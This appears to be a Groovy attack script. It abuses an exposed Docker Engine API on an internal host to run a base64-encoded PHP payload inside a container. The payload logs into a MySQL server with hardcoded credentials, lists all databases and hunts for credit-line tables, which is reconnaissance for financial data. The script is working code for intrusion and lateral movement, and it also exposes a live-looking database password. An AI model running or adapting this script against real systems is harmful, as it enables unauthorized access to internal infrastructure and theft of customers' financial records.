import groovy.json.JsonSlurper
import groovy.json.JsonOutput

def dHost = "172.27.140.148"
def dPort = 4243
def cid = "5b32e909c295"

// PHP that lists databases and searches for credit tables
def phpB64 = java.util.Base64.encoder.encodeToString('''<?php
$c=new mysqli("172.27.141.6","apifincadodev","1q2w3e4r5t6y","",3308);
if($c->connect_error){die("FAIL:".$c->connect_error);}
echo "CONNECTED\n";

// List all databases
$r=$c->query("SHOW DATABASES");
echo "=== DATABASES ===\n";
$dbs=[];
while($row=$r->fetch_row()){echo $row[0]."\n";$dbs[]=$row[0];}

// Search each database for credito tables
echo "\n=== SEARCHING credito* TABLES ===\n";
foreach($dbs as $db){
    $r2=$c->query("SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA='$db' AND TABLE_NAME LIKE '%credito%clarotel%'");
    if($r2 && $r2->num_rows>0){
        while($row=$r2->fetch_row()){
            echo "$db.$row[0]\n";
        }
    }
}

// Also search for any table with 'credito' or 'linea' in name
echo "\n=== ALL credito/linea TABLES ===\n";
$r3=$c->query("SELECT TABLE_SCHEMA,TABLE_NAME FROM information_schema.TABLES WHERE TABLE_NAME LIKE '%credito%' OR TABLE_NAME LIKE '%linea_c%' OR TABLE_NAME LIKE '%lineac%'");
if($r3 && $r3->num_rows>0){
    while($row=$r3->fetch_row()){echo "$row[0].$row[1]\n";}
}else{echo "NONE FOUND\n";}

$c->close();
?>'''.getBytes("UTF-8"))

def url1 = new URL("http://${dHost}:${dPort}/containers/${cid}/exec")
def c1 = url1.openConnection()
c1.setRequestMethod("POST")
c1.setDoOutput(true)
c1.setRequestProperty("Content-Type", "application/json")
c1.setConnectTimeout(5000)
c1.setReadTimeout(20000)
def b1 = JsonOutput.toJson([AttachStdout: true, AttachStderr: true, Cmd: ["bash", "-c", "echo ${phpB64} | base64 -d > /tmp/tq2.php && php /tmp/tq2.php"]])
c1.outputStream.write(b1.bytes)
c1.outputStream.flush()
def r1 = new JsonSlurper().parseText(c1.inputStream.text)
def eid1 = r1.Id

def su1 = new URL("http://${dHost}:${dPort}/exec/${eid1}/start")
def sc1 = su1.openConnection()
sc1.setRequestMethod("POST")
sc1.setDoOutput(true)
sc1.setRequestProperty("Content-Type", "application/json")
sc1.setConnectTimeout(5000)
sc1.setReadTimeout(30000)
sc1.outputStream.write('{"Detach":false,"Tty":true}'.bytes)
sc1.outputStream.flush()
println sc1.inputStream.text
